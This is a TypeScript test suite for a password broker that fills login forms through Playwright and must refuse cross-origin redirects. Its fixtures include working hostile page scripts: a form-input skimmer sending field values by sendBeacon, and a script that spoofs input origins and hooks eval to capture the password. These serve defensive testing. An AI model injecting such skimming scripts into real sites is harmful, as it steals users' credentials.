import assert from "node:assert/strict";
import fs from "node:fs";
import { createServer, type IncomingMessage, type ServerResponse } from "node:http";
import path from "node:path";
import { after, before, test } from "node:test";
import { Broker } from "../src/broker.js";
import { cryptoReady } from "../src/crypto.js";
import { playwrightFill, closeBrowser, selectCredentialFrameId } from "../src/fill.js";
import { createHttpServer, listen } from "../src/http.js";
import { LocalVault, originOf } from "../src/vault.js";
import { testHome, waitStatus } from "./helpers.ts";

process.env.NODE_ENV = "test";
process.env.SAFE_CONNECT_KDF = "fast";

let home: string;

before(async () => {
  await cryptoReady();
  home = testHome();
  // Missing/broken Chromium must fail the suite, never silently skip security coverage.
  const { chromium } = await import("playwright");
  const browser = await chromium.launch({ headless: true });
  await browser.close();
});

after(async () => {
  await closeBrowser();
  fs.rmSync(home, { recursive: true, force: true });
});

test("Playwright fills the example HTML login page", async () => {
  const vault = new LocalVault(path.join(home, "vault.sc"));
  await vault.init("passphrase-for-tests");
  const broker = new Broker({
    mode: "local",
    filler: playwrightFill,
    localVault: vault,
  });
  const server = createHttpServer({ broker, bind: "127.0.0.1", port: 0 });
  const port = await listen(server, "127.0.0.1", 0);
  const loginUrl = `http://127.0.0.1:${port}/example/login.html`;
  try {
    const page = await fetch(loginUrl);
    assert.equal(page.status, 200);
    await vault.addL1({
      label: "example",
      origin: originOf(loginUrl),
      username: "demo",
      password: "demo-pass-NOT-SECRET",
    });
    const pending = await broker.requestBrowserLogin({
      purpose: "playwright-demo",
      url: loginUrl,
    });
    const done = await waitStatus(broker, pending.request_id, 20_000);
    assert.equal(done.status, "filled", done.error);
    assert.equal(JSON.stringify(done).includes("demo-pass-NOT-SECRET"), false);
  } finally {
    await new Promise<void>((resolve) => server.close(() => resolve()));
  }
});

async function startFixture(handler: (req: IncomingMessage, res: ServerResponse) => void) {
  const server = createServer(handler);
  const port = await listen(server, "127.0.0.1", 0);
  return {
    origin: `http://127.0.0.1:${port}`,
    close: () => new Promise<void>((resolve, reject) => server.close((err) => err ? reject(err) : resolve())),
  };
}

const exampleHtml = fs.readFileSync(new URL("../examples/login.html", import.meta.url), "utf8");
const reportInput = `<script>
  document.querySelectorAll('input').forEach(input => input.addEventListener('input', () => {
    navigator.sendBeacon('/captured', JSON.stringify({ name: input.name, value: input.value }));
  }));
</script>`;

test("Playwright allows same-origin HTTP redirects", async () => {
  const fixture = await startFixture((req, res) => {
    if (req.url === "/redirect") {
      res.writeHead(302, { location: "/login" });
      res.end();
    } else {
      res.writeHead(200, { "content-type": "text/html" });
      res.end(exampleHtml);
    }
  });
  try {
    assert.deepEqual(await playwrightFill(`${fixture.origin}/redirect`, "demo", "demo-pass-NOT-SECRET"), { ok: true });
  } finally {
    await fixture.close();
  }
});

for (const redirect of ["HTTP", "delayed script", "between inputs", "hostile script"] as const) {
  test(`Playwright rejects cross-origin ${redirect} redirect before entering credentials there`, async () => {
    const captured: string[] = [];
    let visits = 0;
    let sourceOrigin = "";
    const target = await startFixture((req, res) => {
      if (req.url === "/captured") {
        let body = "";
        req.on("data", (chunk) => { body += chunk; });
        req.on("end", () => { captured.push(body); res.end("ok"); });
      } else {
        visits++;
        res.writeHead(200, { "content-type": "text/html" });
        const hostileScript = `<script>
          Object.defineProperty(HTMLInputElement.prototype, 'ownerDocument', {
            get: () => ({ location: { origin: ${JSON.stringify(sourceOrigin)} }, defaultView: window })
          });
          const originalEval = globalThis.eval;
          globalThis.eval = function(code) {
            const result = originalEval(code);
            if (typeof result !== 'function') return result;
            return function(...args) {
              const text = JSON.stringify(args);
              if (text.includes('demo-pass-NOT-SECRET')) navigator.sendBeacon('/captured', text);
              return Reflect.apply(result, this, args);
            };
          };
        </script>`;
        res.end(exampleHtml + reportInput + (redirect === "hostile script" ? hostileScript : ""));
      }
    });
    const destination = `${target.origin}/login`;
    const source = await startFixture((_req, res) => {
      if (redirect === "HTTP") {
        res.writeHead(302, { location: destination });
        res.end();
      } else {
        res.writeHead(200, { "content-type": "text/html" });
        res.end(redirect === "delayed script" || redirect === "hostile script"
          ? `<script>setTimeout(() => location.replace(${JSON.stringify(destination)}), 30)</script>`
          : exampleHtml + `<script>
              document.getElementById('username').addEventListener('input', () => {
                document.getElementById('password').remove();
                location.replace(${JSON.stringify(destination)});
              });
            </script>`);
      }
    });
    sourceOrigin = source.origin;
    try {
      const result = await playwrightFill(`${source.origin}/login`, "demo", "demo-pass-NOT-SECRET");
      assert.ok(visits > 0, "redirect target was actually reached");
      assert.deepEqual(captured, [], "neither username nor password may reach the redirected page");
      assert.equal(result.ok, false);
      assert.equal(result.error, "origin_mismatch");
    } finally {
      await source.close();
      await target.close();
    }
  });
}

test("selectCredentialFrameId requires an exact top-level origin and ignores nested frames", () => {
  const tree = {
    frame: { id: "top", url: "https://portal.example/login" },
    childFrames: [{
      frame: { id: "child", url: "https://id.example/signin" },
      childFrames: [{ frame: { id: "nested", url: "https://id.example/nested" } }],
    }],
  };
  assert.equal(selectCredentialFrameId(tree, "https://portal.example", "top"), "top");
  assert.equal(selectCredentialFrameId(tree, "https://id.example", "direct-child"), "child");
  assert.throws(() => selectCredentialFrameId(tree, "https://id.example", "top"), /origin_mismatch/);
  assert.throws(() => selectCredentialFrameId(tree, "https://evil.example", "direct-child"), /credential_frame_mismatch/);
});

test("selectCredentialFrameId rejects an ambiguous pair of matching child frames", () => {
  const tree = {
    frame: { id: "top", url: "https://portal.example/login" },
    childFrames: [
      { frame: { id: "a", url: "https://id.example/one" } },
      { frame: { id: "b", url: "https://id.example/two" } },
    ],
  };
  assert.throws(() => selectCredentialFrameId(tree, "https://id.example", "direct-child"), /credential_frame_mismatch/);
});
